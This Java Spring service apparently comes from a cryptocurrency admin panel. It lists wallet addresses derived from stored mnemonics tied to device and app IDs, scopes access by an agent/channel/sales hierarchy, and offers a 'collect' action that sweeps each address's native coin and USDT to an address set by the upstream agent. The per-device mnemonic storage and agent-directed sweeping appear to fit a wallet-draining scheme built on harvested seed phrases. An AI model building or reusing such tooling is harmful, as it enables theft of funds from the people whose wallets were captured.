package com.admin.service;

import java.math.BigDecimal;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;

import org.springframework.stereotype.Service;

import com.admin.auth.AdminContext;
import com.admin.dao.AddressDao;
import com.admin.dao.CollectRecordDao;
import com.admin.dao.MnemonicDao;
import com.admin.entity.AddressEntity;
import com.admin.entity.AdminUserEntity;
import com.admin.entity.CollectRecordEntity;
import com.admin.entity.MnemonicEntity;
import com.admin.util.TimeLabels;
import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;

import lombok.RequiredArgsConstructor;

@Service
@RequiredArgsConstructor
public class AddressAdminService {

    private final AddressDao addressDao;
    private final MnemonicDao mnemonicDao;
    private final CollectRecordDao collectRecordDao;
    private final ScopeService scopeService;
    private final BalanceLiveService balanceLiveService;
    private final UserAdminService userAdminService;
    private final CollectExecuteService collectExecuteService;
    private final DeviceUsdtCacheService deviceUsdtCacheService;

    public Map<String, Object> list(AdminContext ctx, int page, int size, Map<String, String> filters) {
        page = Math.max(page, 0);
        size = Math.min(Math.max(size, 1), 200);
        QueryWrapper<AddressEntity> qw = new QueryWrapper<>();
        String chaintype = val(filters, "chaintype");
        if (!chaintype.isEmpty()) {
            qw.eq("chaintype", chaintype);
        }
        String address = val(filters, "address");
        if (!address.isEmpty()) {
            qw.like("address", address);
        }
        String sort = val(filters, "sort");
        String order = val(filters, "order");
        if ("native".equals(sort) || "usdt".equals(sort) || "usdc".equals(sort)) {
            String col = "native".equals(sort) ? "native_bal" : "usdt".equals(sort) ? "usdt_bal" : "usdc_bal";
            qw.last("ORDER BY CAST(NULLIF(TRIM(" + col + "),'') AS DECIMAL(36,18)) "
                    + ("asc".equalsIgnoreCase(order) ? "ASC" : "DESC") + ", id DESC");
        } else {
            qw.orderByDesc("id");
        }
        List<AddressEntity> all = addressDao.selectList(qw);
        Integer agent = parseInt(val(filters, "agent_id"));
        Integer channel = parseInt(val(filters, "channel_id"));
        Integer sales = parseInt(val(filters, "sales_id"));
        Set<String> extraAppids = scopeService.ownerFilterAppids(ctx, agent, channel, sales);
        String deviceId = val(filters, "device_id");
        String appid = val(filters, "appid");
        List<Map<String, Object>> filtered = new ArrayList<>();
        java.util.Set<String> appIds = new java.util.HashSet<>();
        List<Row> rows = new ArrayList<>();
        for (AddressEntity a : all) {
            MnemonicEntity m = a.getMnemonicId() == null ? null : mnemonicDao.selectById(a.getMnemonicId());
            if (m != null && !scopeService.rowVisible(ctx, m.getAppId(), m.getUserid())) {
                continue;
            }
            String aid = m == null || m.getAppId() == null ? "" : m.getAppId().trim().toLowerCase(Locale.ROOT);
            if (extraAppids != null && !extraAppids.contains(aid)) {
                continue;
            }
            if (!deviceId.isEmpty()) {
                String did = m == null ? "" : String.valueOf(m.getDeviceId());
                if (!did.toLowerCase(Locale.ROOT).contains(deviceId.toLowerCase(Locale.ROOT))) {
                    continue;
                }
            }
            if (!appid.isEmpty() && !aid.contains(appid.toLowerCase(Locale.ROOT))) {
                continue;
            }
            if (!aid.isEmpty()) {
                appIds.add(aid);
            }
            rows.add(new Row(a, m));
        }
        Map<String, String> owners = scopeService.ownerLabelsByAppid(appIds);
        for (Row r : rows) {
            filtered.add(toItem(r.a, r.m, owners));
        }
        int total = filtered.size();
        int totalPages = total == 0 ? 0 : (int) Math.ceil(total / (double) size);
        int from = Math.min(page * size, total);
        int to = Math.min(from + size, total);
        Map<String, Object> data = new LinkedHashMap<>();
        data.put("items", filtered.subList(from, to));
        data.put("page", page);
        data.put("size", size);
        data.put("total", total);
        data.put("totalPages", totalPages);
        data.put("owner_hierarchy", scopeService.filterOwnerHierarchy(ctx));
        data.put("chain_options", List.of(
                Map.of("code", "tron", "label", "TRON"),
                Map.of("code", "eth", "label", "ETH"),
                Map.of("code", "bsc", "label", "BSC"),
                Map.of("code", "btc", "label", "BTC"),
                Map.of("code", "sol", "label", "SOL"),
                Map.of("code", "ton", "label", "TON")));
        return data;
    }

    public Map<String, Object> collectPreview(AdminContext ctx, long addressRowId) {
        AddressEntity addr = addressDao.selectById(addressRowId);
        MnemonicEntity mn = addr == null || addr.getMnemonicId() == null ? null : mnemonicDao.selectById(addr.getMnemonicId());
        String vis = visibleErr(ctx, addr, mn);
        if (vis != null) {
            return fail(vis);
        }
        String chain = normChain(addr.getChaintype());
        String from = addr.getAddress() == null ? "" : addr.getAddress().trim();
        if (!List.of("tron", "eth", "bsc", "btc").contains(chain)) {
            return fail("暂不支持链类型：" + (chain.isEmpty() ? "—" : chain));
        }
        AdminUserEntity owner = loadOwner(mn);
        AdminUserEntity agent = scopeService.walkToAgent(owner);
        if (agent == null) {
            return fail("未找到上级代理，无法归集");
        }
        Map<String, String> cmap = userAdminService.collectMap(agent);
        String to = cmap.getOrDefault(chain, "");
        String agentName = agent.getDisplayName() == null || agent.getDisplayName().isBlank()
                ? agent.getUsername() : agent.getDisplayName();
        String nativeBal = nz(addr.getNativeBal());
        String usdtBal = nz(addr.getUsdtBal());
        String usdcBal = nz(addr.getUsdcBal());
        try {
            String[] live = balanceLiveService.fetchAmounts(chain, from);
            if (live != null) {
                nativeBal = nz(live[0]);
                usdtBal = nz(live[1]);
                if (live.length > 2) {
                    usdcBal = nz(live[2]);
                }
            }
        } catch (Exception ignored) {
        }
        Map<String, Object> data = new LinkedHashMap<>();
        data.put("address_row_id", addressRowId);
        data.put("chain", chain);
        data.put("from_address", from);
        data.put("agent_id", agent.getId());
        data.put("agent_username", agent.getUsername());
        data.put("agent_display_name", agentName);
        data.put("native_bal", nativeBal);
        data.put("usdt_bal", usdtBal);
        data.put("usdc_bal", usdcBal);
        data.put("native_symbol", nativeSymbol(chain));
        data.put("chain_label", nativeSymbol(chain));
        if (to == null || to.isBlank()) {
            data.put("ok", false);
            data.put("need_setup", true);
            data.put("error", "上级代理「" + agentName + "」未设定归集地址，请联系其设置。");
            return data;
        }
        List<String> coins = new ArrayList<>();
        if (!"btc".equals(chain) && gt0(usdtBal)) {
            coins.add("usdt");
        }
        if (gt0(nativeBal)) {
            coins.add("native");
        }
        data.put("ok", true);
        data.put("to_address", to);
        data.put("coins", coins);
        data.put("message", "归集地址 " + from + " 将转入上级代理「" + agentName + "」设置的 " + to + " 中，确认执行吗？");
        return data;
    }

    public Map<String, Object> collectExecute(AdminContext ctx, long addressRowId) {
        AddressEntity addr = addressDao.selectById(addressRowId);
        MnemonicEntity mn = addr == null || addr.getMnemonicId() == null ? null : mnemonicDao.selectById(addr.getMnemonicId());
        String vis = visibleErr(ctx, addr, mn);
        if (vis != null) {
            return fail(vis);
        }
        return collectExecuteService.execute(ctx, addressRowId);
    }

    public Map<String, Object> refreshRow(AdminContext ctx, long addressRowId) {
        AddressEntity addr = addressDao.selectById(addressRowId);
        MnemonicEntity mn = addr == null || addr.getMnemonicId() == null ? null : mnemonicDao.selectById(addr.getMnemonicId());
        String vis = visibleErr(ctx, addr, mn);
        if (vis != null) {
            return fail(vis);
        }
        String chain = addr.getChaintype() == null ? "" : addr.getChaintype();
        String address = addr.getAddress() == null ? "" : addr.getAddress().trim();
        if (!balanceLiveService.supports(chain, address)) {
            return fail("暂不支持该链的实时查询");
        }
        String[] amounts = balanceLiveService.fetchAmounts(chain, address);
        if (amounts == null) {
            return fail("查询失败，请稍后重试");
        }
        addr.setNativeBal(nz(amounts[0]));
        addr.setUsdtBal(nz(amounts[1]));
        addr.setUsdcBal(amounts.length > 2 ? nz(amounts[2]) : "0");
        addr.setBalanceRefreshed(System.currentTimeMillis() / 1000.0);
        addressDao.updateById(addr);
        if (mn != null && mn.getDeviceId() != null) {
            try {
                deviceUsdtCacheService.bumpWithUsdt(mn.getDeviceId(), addr.getUsdtBal());
            } catch (Exception ignored) {
            }
        }
        Map<String, Object> ok = new LinkedHashMap<>();
        ok.put("ok", true);
        ok.put("address_row_id", addr.getId());
        ok.put("chain", chain);
        ok.put("address", address);
        ok.put("native_bal", addr.getNativeBal());
        ok.put("usdt_bal", addr.getUsdtBal());
        ok.put("usdc_bal", nz(addr.getUsdcBal()));
        ok.put("updatetime_label", TimeLabels.beijingUnix(addr.getBalanceRefreshed()));
        ok.put("can_collect", canCollect(addr.getNativeBal(), addr.getUsdtBal(), addr.getUsdcBal(), chain));
        return ok;
    }

    public Map<String, Object> collectRecords(AdminContext ctx, int page, int size, String chain, String status, String deviceId, String appid) {
        page = Math.max(page, 0);
        size = Math.min(Math.max(size, 1), 200);
        QueryWrapper<CollectRecordEntity> qw = new QueryWrapper<>();
        if (chain != null && !chain.isBlank()) {
            qw.eq("chain", chain.trim());
        }
        if (status != null && !status.isBlank()) {
            qw.eq("status", status.trim());
        }
        if (deviceId != null && !deviceId.isBlank()) {
            qw.like("deviceId", deviceId.trim());
        }
        if (appid != null && !appid.isBlank()) {
            qw.like("appId", appid.trim());
        }
        qw.orderByDesc("id");
        List<CollectRecordEntity> all = collectRecordDao.selectList(qw);
        List<Map<String, Object>> items = new ArrayList<>();
        for (CollectRecordEntity r : all) {
            if (!scopeService.rowVisible(ctx, r.getAppId(), r.getUserid())) {
                continue;
            }
            Map<String, Object> m = new LinkedHashMap<>();
            m.put("id", r.getId());
            m.put("deviceId", r.getDeviceId());
            m.put("appId", r.getAppId());
            m.put("userid", r.getUserid());
            m.put("addressid", r.getAddressid());
            m.put("chain", r.getChain());
            m.put("coin", r.getCoin());
            m.put("outaddress", r.getOutaddress());
            m.put("inaddress", r.getInaddress());
            m.put("amount", r.getAmount());
            m.put("txHash", r.getTxHash());
            m.put("tx_hash", r.getTxHash());
            m.put("status", r.getStatus());
            m.put("status_label", "success".equalsIgnoreCase(r.getStatus()) ? "成功"
                    : "failed".equalsIgnoreCase(r.getStatus()) ? "失败"
                    : (r.getStatus() == null ? "—" : r.getStatus()));
            m.put("addtime", r.getAddtime());
            m.put("addtime_label", TimeLabels.beijingUnix(r.getAddtime()));
            m.put("addtimeLabel", TimeLabels.beijingUnix(r.getAddtime()));
            m.put("doactionid", r.getDoactionid());
            items.add(m);
        }
        int total = items.size();
        int from = Math.min(page * size, total);
        int to = Math.min(from + size, total);
        Map<String, Object> data = new LinkedHashMap<>();
        data.put("items", items.subList(from, to));
        data.put("page", page);
        data.put("size", size);
        data.put("total", total);
        data.put("totalPages", total == 0 ? 0 : (int) Math.ceil(total / (double) size));
        return data;
    }

    private Map<String, Object> toItem(AddressEntity a, MnemonicEntity m, Map<String, String> owners) {
        String aid = m == null || m.getAppId() == null ? "" : m.getAppId().trim().toLowerCase(Locale.ROOT);
        String chain = a.getChaintype() == null ? "" : a.getChaintype();
        Map<String, Object> item = new LinkedHashMap<>();
        item.put("id", a.getId());
        item.put("mnemonicId", a.getMnemonicId());
        item.put("mnemonic_id", a.getMnemonicId());
        item.put("address", a.getAddress());
        item.put("chaintype", chain);
        item.put("chain", chain);
        item.put("addrIndex", a.getAddrIndex());
        item.put("nativeBal", nz(a.getNativeBal()));
        item.put("usdtBal", nz(a.getUsdtBal()));
        item.put("usdcBal", nz(a.getUsdcBal()));
        item.put("native_bal", nz(a.getNativeBal()));
        item.put("usdt_bal", nz(a.getUsdtBal()));
        item.put("usdc_bal", nz(a.getUsdcBal()));
        item.put("deviceId", m == null ? "" : m.getDeviceId());
        item.put("appId", m == null ? "" : m.getAppId());
        item.put("source", m == null ? "" : m.getSource());
        item.put("owner_label", owners.getOrDefault(aid, "—"));
        item.put("addtime_label", TimeLabels.beijingUnix(a.getAddtime()));
        item.put("updatetime_label", TimeLabels.beijingUnix(a.getBalanceRefreshed()));
        item.put("can_collect", canCollect(a.getNativeBal(), a.getUsdtBal(), a.getUsdcBal(), chain));
        item.put("can_refresh", balanceLiveService.supports(chain, a.getAddress()));
        item.put("explorer_url", explorer(chain, a.getAddress()));
        return item;
    }

    private String visibleErr(AdminContext ctx, AddressEntity addr, MnemonicEntity mn) {
        if (addr == null) {
            return "地址不存在";
        }
        if (mn != null && !scopeService.rowVisible(ctx, mn.getAppId(), mn.getUserid())) {
            return "无权操作该地址";
        }
        return null;
    }

    private AdminUserEntity loadOwner(MnemonicEntity mn) {
        if (mn == null) {
            return null;
        }
        int uid = scopeService.useridOfAppid(mn.getAppId());
        if (uid <= 0 && mn.getUserid() != null) {
            uid = mn.getUserid();
        }
        if (uid <= 0) {
            return null;
        }
        for (AdminUserEntity u : scopeService.allUsers()) {
            if (u.getId() != null && u.getId() == uid) {
                return u;
            }
        }
        return null;
    }

    private static boolean canCollect(String nativeBal, String usdt, String usdc, String chain) {
        String ct = chain == null ? "" : chain.trim().toLowerCase(Locale.ROOT);
        if (!Set.of("tron", "eth", "bsc", "btc", "bnb").contains(ct)) {
            return false;
        }
        return gt0(nativeBal) || gt0(usdt) || gt0(usdc);
    }

    private static boolean gt0(String v) {
        try {
            return new BigDecimal(nz(v)).compareTo(BigDecimal.ZERO) > 0;
        } catch (Exception e) {
            return false;
        }
    }

    private static String nz(String v) {
        return v == null || v.isBlank() ? "0" : v.trim();
    }

    private static String normChain(String chain) {
        String c = chain == null ? "" : chain.trim().toLowerCase(Locale.ROOT);
        if ("bnb".equals(c)) {
            return "bsc";
        }
        return c;
    }

    private static String nativeSymbol(String chain) {
        switch (chain) {
            case "tron":
                return "TRX";
            case "eth":
                return "ETH";
            case "bsc":
                return "BNB";
            case "btc":
                return "BTC";
            default:
                return chain.toUpperCase(Locale.ROOT);
        }
    }

    private static String explorer(String chain, String address) {
        if (address == null || address.isBlank()) {
            return null;
        }
        String c = normChain(chain);
        switch (c) {
            case "eth":
                return "https://etherscan.io/address/" + address;
            case "bsc":
                return "https://bscscan.com/address/" + address;
            case "tron":
                return "https://tronscan.org/#/address/" + address;
            case "btc":
                return "https://mempool.space/address/" + address;
            case "sol":
            case "solana":
                return "https://solscan.io/account/" + address;
            case "ton":
                return "https://tonviewer.com/" + address;
            default:
                return null;
        }
    }

    private static String val(Map<String, String> filters, String key) {
        if (filters == null || filters.get(key) == null) {
            return "";
        }
        return filters.get(key).trim();
    }

    private static Integer parseInt(String raw) {
        if (raw == null || raw.isBlank()) {
            return null;
        }
        try {
            int n = Integer.parseInt(raw);
            return n > 0 ? n : null;
        } catch (Exception e) {
            return null;
        }
    }

    private Map<String, Object> fail(String error) {
        Map<String, Object> m = new LinkedHashMap<>();
        m.put("ok", false);
        m.put("error", error);
        return m;
    }

    private static final class Row {
        final AddressEntity a;
        final MnemonicEntity m;
        Row(AddressEntity a, MnemonicEntity m) {
            this.a = a;
            this.m = m;
        }
    }
}
